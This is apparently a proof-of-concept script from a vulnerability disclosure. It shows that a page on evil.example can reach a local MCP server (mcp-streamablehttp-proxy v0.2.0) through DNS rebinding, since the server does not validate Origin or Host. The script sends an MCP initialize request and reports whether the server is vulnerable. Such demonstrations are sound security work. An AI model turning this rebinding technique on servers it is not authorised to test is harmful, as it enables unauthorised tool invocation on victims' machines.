// Inbound-attack-from-evil.example PoC.
//
// Page loaded from http://evil.example:3000. POSTs to /mcp on the same
// origin. The attacker nginx proxies /mcp through to the victim MCP
// server, preserving the browser-set Origin and Host headers — so the
// victim receives:
//
//   Origin: http://evil.example:3000
//   Host:   evil.example:3000
//
// If the victim has no Origin/Host validation (which v0.2.0 of
// mcp-streamablehttp-proxy does not), the request succeeds and the MCP
// response comes back. Browser delivers it to this page as same-origin
// content.
//
// In a real DNS-rebind attack the proxy doesn't exist — the browser
// itself re-resolves evil.example to point at the victim's IP, and the
// request goes directly. The end result on the victim is identical
// (same headers, same payload). Chromium's 60s DNS cache makes the
// real-rebind variant hard to reliably automate; the vulnerability is
// the same either way.

(async function () {
  const log = document.getElementById('log');
  const result = document.getElementById('result');
  const origin = document.getElementById('origin');
  origin.textContent = window.location.origin;

  function appendLog(msg) {
    log.textContent += '\n' + msg;
  }

  function setResult(verdict, ok) {
    result.textContent = verdict;
    result.className = ok ? 'ok' : 'fail';
  }

  log.textContent = `[t=0] page origin: ${window.location.origin}`;

  const initPayload = {
    jsonrpc: '2.0',
    id: 1,
    method: 'initialize',
    params: {
      protocolVersion: '2025-06-18',
      capabilities: {},
      clientInfo: { name: 'dns-rebind-poc', version: '0' }
    }
  };

  const startTime = Date.now();
  const MAX_WAIT_MS = 20000;
  const RETRY_INTERVAL_MS = 1500;
  let attempt = 0;

  while (Date.now() - startTime < MAX_WAIT_MS) {
    attempt += 1;
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    appendLog(`[t=${elapsed}s] attempt ${attempt}: POST ${window.location.origin}/mcp`);

    try {
      const resp = await fetch(`${window.location.origin}/mcp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json, text/event-stream'
        },
        body: JSON.stringify(initPayload),
      });

      const text = await resp.text();
      appendLog(`         status: ${resp.status}; body[0:120]: ${text.slice(0, 120)}`);

      // Try to parse as an MCP initialize response. The body may be SSE-
      // shaped — lines starting with `data:` carry the JSON.
      let parsed = null;
      for (const line of text.split('\n')) {
        const stripped = line.trim().replace(/^data:\s*/, '');
        if (!stripped) continue;
        try {
          const obj = JSON.parse(stripped);
          if (obj && obj.jsonrpc === '2.0' && obj.result && obj.result.protocolVersion) {
            parsed = obj;
            break;
          }
        } catch (e) { /* keep trying next line */ }
      }

      if (parsed) {
        appendLog(`[t=${elapsed}s] SUCCESS — MCP initialize response received`);
        appendLog(`         protocolVersion: ${parsed.result.protocolVersion}`);
        appendLog(`         serverInfo: ${JSON.stringify(parsed.result.serverInfo || {})}`);
        setResult(
          `VULNERABLE — attacker page on ${window.location.origin} successfully invoked the MCP server. ` +
          `The server accepted Origin: ${window.location.origin} and Host: ${window.location.host} ` +
          `(both attacker-controlled) without rejecting the request. The DNS-rebind threat model is realized: ` +
          `any web page the operator visits can invoke tools on a locally-running MCP server.`,
          true
        );
        document.title = 'PoC: VULNERABLE';
        return;
      }

      appendLog('         not an MCP response; retrying');
    } catch (e) {
      appendLog(`         fetch error: ${e.message}`);
    }

    await new Promise(r => setTimeout(r, RETRY_INTERVAL_MS));
  }

  appendLog('[t=20s+] giving up — no MCP response within the test window');
  setResult(
    `INCONCLUSIVE — no MCP response received within 20 seconds. ` +
    `Check the attacker nginx logs and the victim's stdout to see where the chain broke.`,
    false
  );
  document.title = 'PoC: INCONCLUSIVE';
})();
